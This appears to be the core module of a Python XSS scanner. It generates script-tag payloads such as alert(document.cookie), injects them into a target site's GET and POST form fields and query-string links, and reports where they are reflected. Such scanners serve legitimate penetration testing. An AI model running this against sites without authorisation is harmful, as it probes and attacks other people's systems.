from lib.helper.helper import *
from random import randint
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from lib.helper.Log import *
import string
import random

class core:

    @classmethod
    def xss_reflective_based_payload(cls):
        unique_identifier = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        cls.unique_identifier = unique_identifier
        return f"<!--{unique_identifier}-->"

    @classmethod
    def verify_payload_reflection(cls, response_text):
        if cls.unique_identifier in response_text:
            Log.high(f"Potential vulnerability found. Unique identifier {cls.unique_identifier} is reflected in the response.")
        else:
            Log.info("Payload not reflected in the response.")

    @classmethod
    def generate(cls, eff):
        random_value = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        FUNCTION = [
            f"prompt('XSS{random_value}')",
            f"alert('XSS{random_value}')",
            f"alert(document.cookie+'{random_value}')",
            f"prompt(document.cookie+'{random_value}')",
            f"console.log('XSS{random_value}')"
        ]

        selected_function = random.choice(FUNCTION)

        script_formats = {
            1: lambda x: r"<script/>" + x + r"<\script\>",
            2: lambda x: r"<\script/>" + x + r"<\\script>",
            3: lambda x: r"<\script\> " + x + r"<//script>",
            4: lambda x: r"<script>" + x + r"<\script/>",
            5: lambda x: r"<script>" + x + r"<//script>",
            6: lambda x: r"<script>" + x + r"</script>",
        }

        return script_formats.get(eff, lambda x: x)(selected_function)

    @classmethod
    def post_method(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        forms = bsObj.find_all("form", method=True)

        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = cls.url

            if form["method"].lower().strip() == "post":
                Log.warning("Target have form with POST method: " + C + urljoin(cls.url, action))
                Log.info("Collecting form input key.....")

                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if 'name' not in key.attrs:
                            Log.info("Elemento senza attributo 'name' trovato.")
                            continue

                        if key["type"] == "submit":
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})
                        else:
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + cls.payload)
                            keys.update({key["name"]: cls.payload})
                    except Exception as e:
                        Log.info("Internal error: " + str(e))

                Log.info("Sending payload (POST) method...")
                req = cls.session.post(urljoin(cls.url, action), data=keys)
                if cls.payload in req.text:
                    Log.high("Detected XSS (POST) at " + urljoin(cls.url, req.url))
                    Log.high("Post data: " + str(keys))
                else:
                    Log.info("This page is safe from XSS (POST) attack but not 100% yet...")

    @classmethod
    def get_method_form(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        forms = bsObj.find_all("form", method=True)

        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = cls.url

            if form["method"].lower().strip() == "get":
                Log.warning("Target have form with GET method: " + C + urljoin(cls.url, action))
                Log.info("Collecting form input key.....")

                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if 'name' not in key.attrs:
                            Log.info("Elemento senza attributo 'name' trovato.")
                            continue

                        if key["type"] == "submit":
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})
                        else:
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + cls.payload)
                            keys.update({key["name"]: cls.payload})
                    except Exception as e:
                        Log.info("Internal error: " + str(e))

                Log.info("Sending payload (GET) method...")
                req = cls.session.get(urljoin(cls.url, action), params=keys)
                if cls.payload in req.text:
                    Log.high("Detected XSS (GET) at " + urljoin(cls.url, req.url))
                    Log.high("GET data: " + str(keys))
                else:
                    Log.info("This page is safe from XSS (GET) attack but not 100% yet...")

    @classmethod
    def get_method(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        links = bsObj.find_all("a", href=True)
        for a in links:
            url = a["href"]
            if url.startswith("http://") is False or url.startswith("https://") is False or url.startswith("mailto:") is False:
                base = urljoin(cls.url, a["href"])
                query = urlparse(base).query
                if query != "":
                    Log.warning("Found link with query: " + G + query + N + " Maybe a vuln XSS point")

                    query_payload = query.replace(query[query.find("=") + 1:len(query)], cls.payload, 1)
                    test = base.replace(query, query_payload, 1)

                    query_all = base.replace(query, urlencode({x: cls.payload for x in parse_qs(query)}))

                    Log.info("Query (GET) : " + test)
                    Log.info("Query (GET) : " + query_all)

                    _respon = cls.session.get(test)
                    if cls.payload in _respon.text or cls.payload in cls.session.get(query_all).text:
                        Log.high("Detected XSS (GET) at " + _respon.url)
                    else:
                        Log.info("This page is safe from XSS (GET) attack but not 100% yet...")

    @classmethod
    def main(cls, url, proxy, headers, payload, cookie, method=2, use_dom_based=True):
        print(W + "*" * 15)
        cls.payload = payload
        cls.url = url

        cls.session = session(proxy, headers, cookie)
        Log.info("Checking connection to: " + Y + url)
        try:
            ctr = cls.session.get(url)
            cls.body = ctr.text
        except Exception as e:
            Log.high("Internal error: " + str(e))
            return

        if ctr.status_code > 400:
            Log.info("Connection failed " + G + str(ctr.status_code))
            return
        else:
            Log.info("Connection established " + G + str(ctr.status_code))

        if use_dom_based:
            Log.info("Testing Reflective-based XSS payloads")
            dom_payload = cls.xss_reflective_based_payload()
            Log.info(f"Generated Reflective-based payload: {dom_payload}")
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)

            if query_params:
                for param_name in query_params.keys():
                    injected_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{param_name}={dom_payload}"
                    Log.info(f"Testing injected URL: {injected_url}")
                    response = cls.session.get(injected_url)
                    if cls.unique_identifier in response.text:
                        Log.high(f"Potential vulnerability found. Unique identifier {cls.unique_identifier} is reflected in the response at URL: {injected_url}")
                    else:
                        Log.info(f"No payload reflection detected at URL: {injected_url}")
            else:
                Log.info("No GET parameters found, consider other injection methods for DOM-based testing")

        if method >= 2:
            cls.post_method()
            cls.get_method()
            cls.get_method_form()

        elif method == 1:
            cls.post_method()

        elif method == 0:
            cls.get_method()
            cls.get_method_form()
